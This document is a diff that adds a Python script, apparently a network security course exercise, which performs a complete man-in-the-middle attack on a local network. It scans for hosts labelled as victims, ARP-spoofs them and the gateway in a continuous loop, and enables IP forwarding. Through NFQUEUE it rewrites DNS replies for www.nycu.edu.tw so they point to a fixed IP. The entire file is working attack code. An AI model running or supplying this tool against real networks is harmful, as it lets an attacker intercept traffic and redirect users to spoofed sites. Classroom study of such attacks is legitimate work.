@@ -1,0 +1,122 @@
+#!/usr/bin/env python3
+import scapy.all as scapy
+import os
+import time
+import netfilterqueue
+import threading
+
+
+# task 1: 
+def get_dhcp_server_ip():
+	info = os.popen("cat $(ps aux | grep -o '[/]var/lib/NetworkManager/\S*.lease') | grep dhcp-server-identifier").readlines()
+	return (info[0].split())[-1][:-1]
+
+
+def get_ap_ip():
+	return os.popen("ip r").read().split()[2]
+
+
+def __scan():
+	ap_addr = {'ip' : get_ap_ip(), 'mac': None}
+	dhcp_server_addr = {'ip': get_dhcp_server_ip(), 'mac': None}
+	victim_addrs = []
+	#print('ap:', ap_addr)
+
+	arp_info = os.popen('arp -a').readlines()
+	for dev in arp_info:
+		dev_splited = dev.split() 
+		dev_ip = dev_splited[1][1:-1]
+		dev_mac = dev_splited[3]
+		#print('ip:',dev_ip,'mac:',dev_mac)
+
+		if dev_ip == ap_addr['ip']:
+			ap_addr['mac'] = dev_mac
+		elif dev_ip == dhcp_server_addr['ip']:
+			dhcp_server_addr['mac'] = dev_mac
+		elif dev_mac != '<incomplete>' and dev_ip[-2:]!='.1':
+			victim_addrs.append({'ip': dev_ip, 'mac': dev_mac})
+	devices_addr = {'ap': ap_addr, 'dhcp_server': dhcp_server_addr, 'victims': victim_addrs}
+	
+	return devices_addr
+
+
+def print_devices(devices_addr) :
+	print('Available devices')
+	print('-------------------------------------')
+	print ("IP                  MAC")
+	print('-------------------------------------')
+
+	if devices_addr['dhcp_server']['mac'] is not None:
+		print ("{:<20}{:<20}".format(devices_addr['dhcp_server']['ip'], devices_addr['dhcp_server']['mac']))
+	for vic in devices_addr['victims']:
+		print ("{:<20}{:<20}".format(vic['ip'], vic['mac']))
+
+
+# task 4: dns spoofing
+def packet_handler(packet):
+	temp_packet = scapy.IP(packet.get_payload())
+	
+	if temp_packet.haslayer(scapy.DNSRR) and ("www.nycu.edu.tw").encode() in temp_packet[scapy.DNSQR].qname:
+		temp_packet[scapy.DNS].an = scapy.DNSRR(rrname=temp_packet[scapy.DNSQR].qname, rdata="140.113.207.246")
+		
+		del temp_packet[scapy.IP].len
+		del temp_packet[scapy.IP].chksum
+		del temp_packet[scapy.UDP].len
+		del temp_packet[scapy.UDP].chksum
+					
+		packet.set_payload(bytes(temp_packet))
+	packet.accept()
+
+
+def pharm():
+	# Create a queue
+	os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 1")
+
+	q = netfilterqueue.NetfilterQueue()
+	q.bind(1, packet_handler)
+	q.run()
+
+
+# task 2: arp spoofing
+def spoof(target , spoofing_ip ) :
+	packet = scapy.ARP(op=2, pdst=target['ip'], hwdst=target['mac'], psrc=spoofing_ip) # 2 for response
+	scapy.send( packet , verbose=False)
+
+
+def arp_attack(victims, ap_addr) :
+	while True:
+		for v in victims:
+			spoof( v, ap_addr['ip'] )
+			spoof( ap_addr , v['ip'] )
+		time.sleep(1)
+
+
+def recover_arp(target , src) :
+	packet = scapy.ARP(op=2 , pdst=target['ip'] , hwdst=target['mac'] , psrc=src['ip'] , hwsrc=src['mac'])
+	scapy.send(packet , count=4 , verbose=False )	
+
+
+def main():
+	devices_addr = __scan()
+	print_devices(devices_addr)
+
+	try:
+		os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
+
+		dns_spoofer_thread = threading.Thread(target=pharm)
+		dns_spoofer_thread.setDaemon(True)
+		dns_spoofer_thread.start()
+
+		arp_attack(devices_addr['victims'], devices_addr['ap'])
+		
+	except KeyboardInterrupt:
+		for v in devices_addr['victims']:
+			recover_arp(v , devices_addr['ap'])
+			recover_arp(devices_addr['ap'] , v)
+
+		os.system("sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
+		os.system("iptables -F")
+
+
+if __name__ == '__main__':
+	main()
